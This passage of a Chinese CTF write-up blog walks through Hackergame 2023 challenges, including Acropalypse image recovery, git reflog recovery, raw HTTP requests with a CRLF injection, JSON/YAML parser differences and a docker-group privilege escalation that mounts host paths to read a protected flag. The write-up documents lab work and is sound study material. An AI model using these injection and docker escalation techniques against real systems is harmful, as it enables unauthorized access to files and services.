src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030093156853.png" alt="image-20231030093156853"></p><p>发包后我们下在(2,2)位置即可获胜</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030092932846.png" alt="image-20231030092932846"></p><h3 id="奶奶的睡前-flag-故事"><a href="#奶奶的睡前-flag-故事" class="headerlink" title="奶奶的睡前 flag 故事"></a>奶奶的睡前 flag 故事</h3><p>题目给的png如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/screenshot.png" alt="screenshot"></p><p>再看看题目的提示</p><blockquote><p>晴空万里的假期终于拍了拍翅膀飞来了。对于一心想扔掉教材、砸掉闹钟、跃向世界的 L 同学来说，期待了整整三年的跨国旅游大业终于是时候启动了，还能巧妙地顺带着做个美满的老友记。</p><p>可是，哎哟喂，他刚踩上波光粼粼的金沙海滩，那他最疼爱的华为手机就跟着海风一起去约会了大海，连他的钱包也在这场未知探索之旅中神秘失踪。</p><p>「这个地方怎么连个华为手机都不卖。若是买个苹果手机，心疼的是它连个实体 SIM 卡槽都藏起来了，回国肯定成了个大摆设。不如来个<strong>谷歌的『亲儿子』</strong>？」L 同学踌躇满志地嘀咕道。</p><p>那时，像是上天的安排，「咱这儿正好有个<strong>谷歌『亲儿子』</strong>的老手机，你拿去逍遥吧」。</p><p>L 同学满眼星光地接过，<strong>连系统都没心思升级</strong>，就开始疯狂安装那个久闻大名的 GPT 程序，甚至雀跃地在群里晒出一张跟 GPT 对话的精彩<strong>截图</strong>，一时间成为了群里的焦点人物。</p></blockquote><p>谷歌亲儿子很显然是pixel，所以考虑去找它的截图漏洞</p><p>查阅新闻发现和win11的那个同属Acropalypse漏洞</p><p>那么直接用<strong>Acropalypse-Multi-Tool</strong>工具即可</p><p>由于不知道手机具体幸好，只能多试几次</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028183821972.png" alt="image-20231028183821972"></p><p>flag为<code>flag&#123;sh1nj1ru_k0k0r0_4nata_m4h0&#125;</code></p><h3 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h3><p>观察源代码，可以发现消息内容在span元素中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028195734693.png" alt="image-20231028195734693"></p><p>编写油猴脚本，对span中的文字进行正则匹配，如果匹配flag则点击该span元素</p><p>exp如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Hack Clicker</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      1.0</span></span><br><span class="line"><span class="comment">// @description  Clicks on elements containing hack[...] in a span tag on the page</span></span><br><span class="line"><span class="comment">// @author       R1ck</span></span><br><span class="line"><span class="comment">// @match        http://202.38.93.111:10021/</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">clickElementIfContainsHack</span>(<span class="params">element</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> text = element.<span class="property">textContent</span>;</span><br><span class="line">        <span class="keyword">let</span> regex = <span class="regexp">/hack\[[a-z]+\]/g</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (regex.<span class="title function_">test</span>(text)) &#123;</span><br><span class="line">            element.<span class="title function_">click</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">observeAndClickElements</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(<span class="function"><span class="params">mutations</span> =&gt;</span> &#123;</span><br><span class="line">            mutations.<span class="title function_">forEach</span>(<span class="function"><span class="params">mutation</span> =&gt;</span> &#123;</span><br><span class="line">                mutation.<span class="property">addedNodes</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (node.<span class="property">nodeType</span> === <span class="title class_">Node</span>.<span class="property">ELEMENT_NODE</span>) &#123;</span><br><span class="line">                        <span class="keyword">let</span> spans = node.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">                        spans.<span class="title function_">forEach</span>(<span class="function"><span class="params">span</span> =&gt;</span> &#123;</span><br><span class="line">                            <span class="title function_">clickElementIfContainsHack</span>(span);</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        observer.<span class="title function_">observe</span>(<span class="variable language_">document</span>.<span class="property">body</span>, &#123; <span class="attr">childList</span>: <span class="literal">true</span>, <span class="attr">subtree</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">observeAndClickElements</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;Web_pr0gra_mm1ng_8fed6bb815_15fun&#125;</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028202238559.png" alt="image-20231028202238559"></p><h3 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git?Git!"></a>Git?Git!</h3><p>本题直接获得了带<code>.get</code>隐藏文件的git仓库</p><p>在目录下执行<code>git log --stat</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030113328136.png" alt="image-20231030113328136"></p><p>发现最新一次的修改中并没有想要的信息</p><p>但是题目中提到马老师<strong>撤销了一次提交</strong></p><p>被撤销的提交记录是可以在<code>git reflog</code>中看到</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030113602712.png" alt="image-20231030113602712"></p><p>我们可以观察到一个<code>git log</code>中没有的版本号，即被删除的commit</p><p>执行<code>git reset --hard 505e1a3</code>回退到该版本</p><p>再查看与之前版本的区别</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030113840234.png" alt="image-20231030113840234"></p><p>执行<code>git diff 15fd0a1</code>，得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030114001151.png" alt="image-20231030114001151"></p><h3 id="HTTP集邮册"><a href="#HTTP集邮册" class="headerlink" title="HTTP集邮册"></a>HTTP集邮册</h3><h4 id="5种状态码"><a href="#5种状态码" class="headerlink" title="5种状态码"></a>5种状态码</h4><p>获取200状态只需发送正常请求即可</p><p>将请求方法换为一个不存在的，即可导致语法错误，此时服务端会返回400（Bad Request）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R1ck / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028191449425.png" alt="image-20231028191449425"></p><p>想要获取404，则需要请求一个不存在的页面</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /nothing HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028190118345.png" alt="image-20231028190118345"></p><p>由于服务端只接收GET请求，所以当我们将GET换成POST时，服务端可能会返回405（Method Not Allowed）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028190148030.png" alt="image-20231028190148030"></p><p>而如果我们传入的uri过长，则会导致410（Request-URI Too Large）状态码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /aaaaaaa(此处大约有4000个a，这里就不显示了) HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028190938623.png" alt="image-20231028190938623"></p><h4 id="没有状态……哈？"><a href="#没有状态……哈？" class="headerlink" title="没有状态……哈？"></a>没有状态……哈？</h4><p>关于无状态码的判断逻辑如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">crlf = buf.find(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> buf.strip() != <span class="string">b&quot;&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> crlf == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;No CRLF found&quot;</span>)</span><br><span class="line">        status_line = buf[:crlf]</span><br><span class="line">        http_version, status_code, reason_phrase = status_line.split(<span class="string">b&quot; &quot;</span>, <span class="number">2</span>)</span><br><span class="line">        status_code = <span class="built_in">int</span>(status_code)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        buf += <span class="string">&quot;（无状态码）&quot;</span>.encode()</span><br><span class="line">        status_code = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>很显然是<strong>CRLF注入</strong>，具体原理参考文章<a href="https://blog.csdn.net/weixin_40412037/article/details/106217834">Nginx 配置错误导致漏洞（CRLF注入漏洞）——漏洞复现_配置错误漏洞-CSDN博客</a></p><p>在URL处填入CRLF，那么此时响应报文中就没有响应头存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /\r\n HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029155120678.png" alt="image-20231029155120678"></p><h4 id="12种状态码"><a href="#12种状态码" class="headerlink" title="12种状态码"></a>12种状态码</h4><p>当我们输入一个服务器不支持的HTTP版本时，会返回505（HTTP Version not supported）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">2.0</span>\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029093358057.png" alt="image-20231029093358057"></p><div class="note info flat"><p>HTTP的请求头中有一种Range字段，可以控制请求的资源<strong>字节范围</strong></p><p>语法为<code>Range: bytes=start-end</code>，用于请求部分资源</p><p>例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Range: bytes=10- ：第10个字节及最后个字节的数据</span><br><span class="line">Range: bytes=40-100 ：第40个字节到第100个字节之间的数据.</span><br></pre></td></tr></table></figure></div><p>当我们设置的Range范围服务器能够返回，则会响应206（Partial Content）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Range: bytes=0-1\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029160434646.png" alt="image-20231029160434646"></p><p>但是当客户端请求的 <strong>Range 头部格式不正确</strong>，或者客户端请求的 <strong>Range 超出了服务器支持的范围</strong>，那么服务器就会响应416（Range Not Satisfiable）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Range: bytes=10000-10000\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029160719033.png" alt="image-20231029160719033"></p><p>当我们的请求头中存在一个服务器不支持的字段时，则会返回501（Not Implemented）</p><p>这里我们试出来了<strong>Transfer-Encoding</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Transfer-Encoding:\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029161526225.png" alt="image-20231029161526225"></p><div class="note info flat"><p>在浏览器和服务端设置都允许缓存策略的前提下（服务端响应头的Cache-Control不为no-store，即禁止任何缓存），如果某个请求的响应头设置了Last-Modified：</p><p>第一次请求：浏览器会记住响应头的Last-Modified；<br>第二次及以后请求：浏览器会携带保存的Last-Modified分别作为If-Modified-Since放入请求头中携带过去，以此到服务端验证此次请求的资源是否过期或更新；服务端进行判断，若过期或更新，则返回新的资源；否则返回空<strong>以及状态码304</strong>，节省服务端消耗。</p></div><p>本题服务器的资源应该是静态的，所以我们可以主动发送<code>If-Modified-Since</code>字段，时间设置为响应头中<code>Last-Modified</code>的值，此时服务器会返回304（Not Modified）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029163653605.png" alt="image-20231029163653605"></p><div class="note info flat"><p>HTTP 协议中的 <strong><code>If-Unmodified-Since</code></strong> 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 <code>POST</code>或其他 non-safe 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 <code>412</code> (Precondition Failed) 错误。</p></div><p>此处我们将<code>If-Unmodified-Since</code>字段的时间设置在响应头中<code>Last-Modified</code>的时间之前，服务器就无法满足我们的要求，并会返回412</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">If-Unmodified-Since: Tue, 14 Aug 2023 17:03:04 GMT\r\n\r\n</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029164647337.png" alt="image-20231029164647337"></p><div class="note info flat"><p><strong><code>Expect</code></strong> 是一个请求消息头，包含一个期望条件，表示服务器只有在满足此期望条件的情况下才能妥善地处理请求。</p><p>规范中定义的唯一期望是<code>Expect: 100-continue</code>，服务器应该以此作为回应：</p><ul><li><p><code>100</code> 如果标题中包含的信息足以立即获得成功，</p></li><li><p><code>417</code>（期望失败），如果它不能达到预期; 或者其他任何其他 4xx 状态。</p></li></ul></div><p>本题我们直接用<code>Expect: 100-continue</code>进行试验，发现服务器返回了响应码100（Continue）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Expect: 100-continue\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure><p><strong>成功！</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029170019231.png" alt="image-20231029170019231"></p><h3 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h3><p>题目提示<strong>通过无线信道传输图片</strong>，那么应该就是<strong>SSTV慢扫描电视</strong>，我们需要解码无线电</p><p>使用软件<strong>RX-SSTV</strong></p><p>连上虚拟声卡后开始播放音频</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029091252133.png" alt="image-20231029091252133"></p><p><code>flag&#123;SSssTV_y0u_W4NNa_HaV3_4_tr&#125;</code></p><h3 id="JSON-⊂-YAML"><a href="#JSON-⊂-YAML" class="headerlink" title="JSON ⊂ YAML?"></a>JSON ⊂ YAML?</h3><p>这题主要是研究YAML和JSON的区别</p><p>题目需要给出一个字符串，使得其在解析为YAML1.1时和JSON时不同</p><p>下面这篇文章讲的非常详细：<a href="https://john-millikin.com/json-is-not-a-yaml-subset">JSON is not a YAML subset (john-millikin.com)</a></p><h4 id="JSON-⊄-YAML-1-1"><a href="#JSON-⊄-YAML-1-1" class="headerlink" title="JSON ⊄ YAML 1.1"></a>JSON ⊄ YAML 1.1</h4><p>在以指数表示法处理数字时，YAML 1.1 规范对数字的语法比 JSON 更严格：<code>1e2</code> 是有效的 JSON 数字，但 YAML 1.1 要求将其编写为 <code>1.0e+2</code>。此时YAML 解析器会将<code>1e2</code>视为字符串。</p><p>所以我们尝试向题目传入<code>&#123;&quot;R1ck&quot;:1e2&#125;</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029100855804.png" alt="image-20231029100855804"></p><h4 id="JSON-⊄-YAML-1-2"><a href="#JSON-⊄-YAML-1-2" class="headerlink" title="JSON ⊄ YAML 1.2"></a>JSON ⊄ YAML 1.2</h4><p>本题需要在解析为YAML1.1时正常但YAML1.2时出现异常</p><p>这里需要用到json、yaml和ruamel.yaml这几个包的特性</p><p><code>json.loads</code>和<code>yaml.safe_load</code>解析含有重复key的json数据时，后来的值会覆盖原来的值，导致最后只有一个key的值留下来。</p><p>但是YAML1.2更加严格，重复的键会导致<code>ruamel.yaml.safe_load</code>报错</p><p>所以我们尝试向题目传入<code>&#123;&quot;R1ck&quot;:1,&quot;R1ck&quot;:2&#125;</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030162007980.png" alt="image-20231030162007980"></p><h3 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h3><p>详细原理参考文章<a href="https://blog.csdn.net/qq_41918771/article/details/103666135">docker用户组提权_docker命令提权-CSDN博客</a></p><p>在宿主机，执行<code>ls -la /</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029141240632.png" alt="image-20231029141240632"></p><p>发现flag为软链接</p><p>执行<code>docker run -v /dev/shm/:/flag -i -t alpine</code>将该目录映射给docker的flag目录</p><p>由于我们在docker中有root权限，所以可以查看flag文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029142940311.png" alt="image-20231029142940311"></p><h3 id="惜字如金-2-0"><a href="#惜字如金-2-0" class="headerlink" title="惜字如金 2.0"></a>惜字如金 2.0</h3><p>题目所给的惜字如金原则如下</p><ul><li>第一原则（又称 creat 原则）：如单词最后一个字母为「<code>e</code>」或「<code>E</code>」，且该字母的上一个字母为辅音字母，则该字母予以删除。</li><li>第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。</li></ul><p>使用python调试所给源码，尝试补全删除掉的字母</p><p>首先是<code>if __name__ == &#39;__main__&#39;:</code>中name被删掉的e</p><p>接着后面两句比较方法中的单词也需要补全来满足该方法的判断标准，即传进去的两个变量相等</p><p>最后就是<code>get_cod_dict</code>方法</p><p>其中会验证几个字符串是否满足24个字符的长度，源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cod_dict</span>():</span><br><span class="line">    <span class="comment"># prepar th cod dict</span></span><br><span class="line">    cod_dict = []</span><br><span class="line">    cod_dict += [<span class="string">&#x27;nymeh1niwemflcir&#125;echaet&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ty9kxborszstguyd?!blm-p&#x27;</span>]</span><br><span class="line">    check_equals(<span class="built_in">set</span>(<span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> cod_dict), &#123;<span class="number">24</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(cod_dict)</span><br></pre></td></tr></table></figure><p>这4个字符串都是23个字符，所以需要每个字符串需要补充一个字符，此处需要进行爆破被删除字符的位置以及原因（满足了哪个原则）</p><p>但是事实上本题的字符数量不算多，所以可以先通过肉眼观察一些特征来简化计算量</p><p>比如最终flag字符串的格式为<code>flag&#123;xxx-xxx&#125;</code>那么其中可以先寻找一下这几个字符目前在字典中的位置</p><p><code>f</code>在字典的index为53，即第三个字符串的第6位，但此时<code>f</code>在第5位，说明删除的字符在<code>f</code>之前</p><p><code>l</code>在字典的index为41，即第二个字符串的18位，但此时18位上也为<code>l</code>，说明第二个字符串被删除的字符在<code>l</code>之后</p><p><code>g</code>的位置有问题，说明最后一个字符串删除位置在<code>g</code>之前</p><p><code>&#123;</code>位置有问题，说明第四个字符串删除位置在<code>&#123;</code>之前</p><p>将被删除的位置按原则还原</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Th size of the fill may reduce after XZRJification</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_equals</span>(<span class="params">left, right</span>):</span><br><span class="line">    <span class="comment"># check whether left == right or not</span></span><br><span class="line">    <span class="keyword">if</span> left != right: exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code_dict</span>():</span><br><span class="line">    <span class="comment"># prepar th code dict</span></span><br><span class="line">    code_dict = []</span><br><span class="line">    code_dict += [<span class="string">&#x27;nymeh1niwemflcir&#125;echaete&#x27;</span>]</span><br><span class="line">    code_dict += [<span class="string">&#x27;a3g7&#125;kidgojernoetlsupe?h&#x27;</span>]</span><br><span class="line">    code_dict += [<span class="string">&#x27;ulwe!f5soadrhwnrsnstnoeq&#x27;</span>]</span><br><span class="line">    code_dict += [<span class="string">&#x27;cte&#123;l-findiehaai&#123;oveatas&#x27;</span>]</span><br><span class="line">    code_dict += [<span class="string">&#x27;tye9kxborszstguyd?!blm-p&#x27;</span>]</span><br><span class="line">    check_equals(<span class="built_in">set</span>(<span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> code_dict), &#123;<span class="number">24</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(code_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">input_codes</span>):</span><br><span class="line">    <span class="comment"># retriev th decrypted data</span></span><br><span class="line">    code_dict = get_code_dict()</span><br><span class="line">    output_chars = [code_dict[c] <span class="keyword">for</span> c <span class="keyword">in</span> input_codes]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(output_chars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># check som obvious things</span></span><br><span class="line">    check_equals(<span class="string">&#x27;creat&#x27;</span>, <span class="string">&#x27;cre&#x27;</span> + <span class="string">&#x27;at&#x27;</span>)</span><br><span class="line">    check_equals(<span class="string">&#x27;referrer&#x27;</span>, <span class="string">&#x27;refer&#x27;</span> + <span class="string">&#x27;rer&#x27;</span>)</span><br><span class="line">    <span class="comment"># check th flag</span></span><br><span class="line">    flag = decrypt_data([<span class="number">53</span>, <span class="number">41</span>, <span class="number">85</span>, <span class="number">109</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">77</span>, <span class="number">90</span>,</span><br><span class="line">                         <span class="number">17</span>, <span class="number">118</span>, <span class="number">36</span>, <span class="number">25</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">3</span>, <span class="number">63</span>, <span class="number">25</span>,</span><br><span class="line">                         <span class="number">31</span>, <span class="number">77</span>, <span class="number">27</span>, <span class="number">60</span>, <span class="number">3</span>, <span class="number">118</span>, <span class="number">24</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">61</span>,</span><br><span class="line">                         <span class="number">25</span>, <span class="number">63</span>, <span class="number">77</span>, <span class="number">36</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">60</span>, <span class="number">67</span>, <span class="number">113</span>, <span class="number">28</span>])</span><br><span class="line">    check_equals(flag.index(<span class="string">&#x27;flag&#123;&#x27;</span>), <span class="number">0</span>)</span><br><span class="line">    check_equals(flag.index(<span class="string">&#x27;&#125;&#x27;</span>), <span class="built_in">len</span>(flag) - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print th flag</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>运行后输出flag：<code>flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</code></p><h3 id="高频率星球"><a href="#高频率星球" class="headerlink" title="高频率星球"></a>高频率星球</h3><p>在kali上安装asciinema</p><p><code>sudo apt-get install asciinema</code></p><p>执行<code>asciinema cat asciinema_restore.rec &gt; flag.txt</code></p><p>将所以shell的指令以及打印信息输出出来</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029132504559-16990761197511.png" alt="image-20231029132504559"></p><p>我们可以看到，高频率星人先<strong>验证了flag.js的哈希值</strong></p><p>然后<strong>使用less将flag.js打印出来</strong></p><p>最后需要执行<code>node flag.js</code>，而此时录制信息也结束了</p><p>所以我们可以从刚刚保存的flag.txt中将flag.js提取出来，然后自己用nodejs执行</p>]]></content>
      
      
      <categories>
          
          <category> Hackergame </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Hackergame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏Mindustry 逻辑入门</title>
      <link href="/posts/35d972d0ed87/"/>
